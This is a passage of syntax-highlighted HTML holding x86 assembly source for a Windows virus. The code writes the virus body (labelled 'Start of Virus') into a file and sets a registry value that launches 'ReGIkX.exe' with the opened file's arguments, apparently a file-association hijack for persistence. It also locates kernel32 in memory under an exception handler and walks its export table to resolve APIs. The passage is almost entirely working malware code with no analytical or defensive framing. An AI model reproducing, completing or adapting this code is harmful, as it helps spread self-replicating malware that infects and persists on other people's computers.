        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">@@Fhandle</span><span class="sc4">],</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@Prob</span><span class="sc0">

</span><span class="sc1">;Write to the File</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC9</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">      </span><span class="sc1">;Address of Str</span><span class="sc0">
                                                          </span><span class="sc1">;WriteFileA</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc5">@@K32</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">@@GetProcAdd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">;-------</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc10">Large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;Not used Overlapped</span><span class="sc0">

        </span><span class="sc1">;Push    @@Temp                 ;used to hold how much is written</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">@@Temp</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">600h</span><span class="sc0">                    </span><span class="sc1">;size to write</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">      </span><span class="sc1">;Address of </span><span class="sc0">
                                                         </span><span class="sc1">;Start of Virus</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">@@Fhandle</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
         
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">Ecx</span><span class="sc0">                     </span><span class="sc1">;Write File</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@ProbCloseFile</span><span class="sc0">

</span><span class="sc1">;--------</span><span class="sc0">

        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc10">Large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;Not used Overlapped</span><span class="sc0">

        </span><span class="sc1">;Push    @@Temp                 ;used to hold how much is written</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">@@Temp</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">VSize</span><span class="sc0">                   </span><span class="sc1">;size to write</span><span class="sc0">
       </span><span class="sc1">; push    1A00h                   ;2000h - 600h from above</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">      </span><span class="sc1">;Address of </span><span class="sc0">
                                                         </span><span class="sc1">;Start of Virus</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">@@Fhandle</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
         
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">Edi</span><span class="sc0">                     </span><span class="sc1">;Write File</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@ProbCloseFile</span><span class="sc0">

</span><span class="sc1">;--------</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc10">Large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;Not used Overlapped</span><span class="sc0">

        </span><span class="sc1">;Push    @@Temp                 ;used to hold how much is written</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">@@Temp</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc2">2000h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">600h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VSize</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;size to write</span><span class="sc0">
 

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">      </span><span class="sc1">;Address of </span><span class="sc0">
                                                         </span><span class="sc1">;Start of Virus</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">@@Fhandle</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
         
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">Edi</span><span class="sc0">                     </span><span class="sc1">;Write File</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@ProbCloseFile</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0"> 
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@GetDebug</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"User32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">@@GetDebug</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@LoadLib</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@DebugMess</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">@@DebugMess</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@M1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Write File Sucess"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">@@M1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@M2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GoodBye"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">@@M2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">Ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc5">@@cont</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc1">;---------------------- </span><span class="sc0">

</span><span class="sc5">@@ProbCloseFile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;close the File</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">   </span><span class="sc1">;Address of Str</span><span class="sc0">
                                                        </span><span class="sc1">;CloseHandle</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc5">@@K32</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">@@GetProcAdd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,[</span><span class="sc5">@@Fhandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">Ecx</span><span class="sc0">
 

        </span><span class="sc1">;Murk</span><span class="sc0">

</span><span class="sc5">@@Prob</span><span class="sc4">:</span><span class="sc0">          

</span><span class="sc1">;--------------------- </span><span class="sc0">
</span><span class="sc1">;Now set the Registery key</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@GL3</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RegSetValueExA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@GL3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc5">@@hAdv</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">@@GetProcAdd</span><span class="sc0">
        

</span><span class="sc1">;        push    large 18D               ;Should be lenght of string below</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@@StrLen</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@GetNew</span><span class="sc0">
</span><span class="sc5">@@New</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'"ReGIkX.exe" %1 %*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@StrLen</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@@New</span><span class="sc0">
</span><span class="sc5">@@GetNew</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">@@hKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc0">       

</span><span class="sc1">;-------------------- </span><span class="sc0">
</span><span class="sc5">@@CloseKey</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Close the key</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@GL4</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RegCloseKey"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@GL4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc5">@@hAdv</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">@@GetProcAdd</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@hKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">Ecx</span><span class="sc0">
</span><span class="sc1">;Murk1</span><span class="sc0">
</span><span class="sc1">;        push    255d</span><span class="sc0">
</span><span class="sc1">;        call    @@strBuf</span><span class="sc0">
</span><span class="sc1">;        db      255d dup(0)</span><span class="sc0">
</span><span class="sc1">;@@strBuf:</span><span class="sc0">
        
</span><span class="sc5">@@uups</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;=====================================</span><span class="sc0">
</span><span class="sc5">@@GetProcAdd</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">   </span><span class="sc5">WINDOWS</span><span class="sc0">   
</span><span class="sc1">;accepts the procname and the handle of a dll</span><span class="sc0">
</span><span class="sc1">;returns in ecx the address of the api</span><span class="sc0">
</span><span class="sc5">ARG</span><span class="sc0">     </span><span class="sc5">@@hAdv</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc5">@@ProcName</span><span class="sc4">:</span><span class="sc10">Dword</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@@ProcName</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@@hAdv</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@@GetProcAdd</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc5">SetReg</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;=====================================</span><span class="sc0">
</span><span class="sc1">;-------------------------------------</span><span class="sc0">
</span><span class="sc1">;GetMZ subroutine</span><span class="sc0">
</span><span class="sc1">;Passed</span><span class="sc0">
</span><span class="sc1">;EAX = the address we want to start looking for</span><span class="sc0">
</span><span class="sc1">;Returns the MZ header location above this</span><span class="sc0">
</span><span class="sc1">;RETURNS IN EAX THE LOCATION OF THE MZ header</span><span class="sc0">
</span><span class="sc1">;Should be the Load VA for the program</span><span class="sc0">
</span><span class="sc5">GetMZ</span><span class="sc0">   </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">Pusha</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc1">;Set up a SEH handler</span><span class="sc0">
</span><span class="sc5">@@GetMZ_SetSeh</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@@GetMZ_FindExcept</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc1">;set Esi = eax</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">@@GetMZ_LoopFind</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;this checks for the MZ and the PE if both are not found</span><span class="sc0">
        </span><span class="sc1">;but MZ is we assume an error and exit out</span><span class="sc0">
        </span><span class="sc1">;with esi = 0</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0FFFFF000h</span><span class="sc0">
    </span><span class="sc6">Pusha</span><span class="sc0">
    </span><span class="sc6">Lodsw</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">Jne</span><span class="sc0">     </span><span class="sc5">@@GetMZ_NotFound</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3Ah</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@GetMZ_Found</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@GetMZ_Found</span><span class="sc0">   </span><span class="sc1">;Not really assume error and return with esi</span><span class="sc0">
                            </span><span class="sc1">; = 0</span><span class="sc0">

</span><span class="sc5">@@GetMZ_NotFound</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@GetMZ_LoopFind</span><span class="sc0">

</span><span class="sc5">@@GetMZ_FindExcept</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">         </span><span class="sc1">;esp + 4</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">@@GetMZ_SetSeh</span><span class="sc0">

</span><span class="sc5">@@GetMZ_Found</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Popa</span><span class="sc0">            </span><span class="sc1">;esi = the MZ header</span><span class="sc0">

        </span><span class="sc1">;restore the the orginal SEH</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc1">; Set our Eax to be the return Value</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">Popa</span><span class="sc0">

        </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">GetMZ</span><span class="sc0">   </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;Takes EAX = K32 VA</span><span class="sc0">
</span><span class="sc1">;Returns</span><span class="sc0">
</span><span class="sc1">;eax = K32 address or 0 if failure </span><span class="sc0">
</span><span class="sc1">;fs:[14] = GetProcessAddress if Succcess</span><span class="sc0">
 
</span><span class="sc5">GetAPI</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc5">WINDOWS</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0">
 
</span><span class="sc1">;LOCAL   @@gaWorkSp:dword,@@gaGetPAdd:dword,@@gaNindex:dword,@@gaAddOrd:dword,@@gaAddName:dword,@@gaAddFunc:dword,@@gaLimit:dword,@@gaBASE:dword,@@gaK32:dword</span><span class="sc0">

</span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">@@gaWorkSp</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">@@gaGetPAdd</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">@@gaNindex</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">@@gaAddOrd</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">@@gaAddName</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">@@gaAddFunc</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">@@gaLimit</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">@@gaBASE</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">@@gaK32</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">

    </span><span class="sc6">pusha</span><span class="sc0">           </span><span class="sc1">;Save everthing</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">Eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">Ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;get PE location</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">@@gaBASE</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;save VA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">@@gaK32</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;save PE location</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">Eax</span><span class="sc4">,[</span><span class="sc8">Ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Edata Loc</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">Esi</span><span class="sc4">,[</span><span class="sc8">Eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">Ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;should be the Base of the Edata</span><span class="sc0">
        </span><span class="sc6">Lea</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc4">,[</span><span class="sc5">@@gaBASE</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Starting pnt for the ordinal</span><span class="sc0">
                        </span><span class="sc1">;exported by this DLL</span><span class="sc0">
    </span><span class="sc1">;now that Esi and Edi point to the correct loactions</span><span class="sc0">
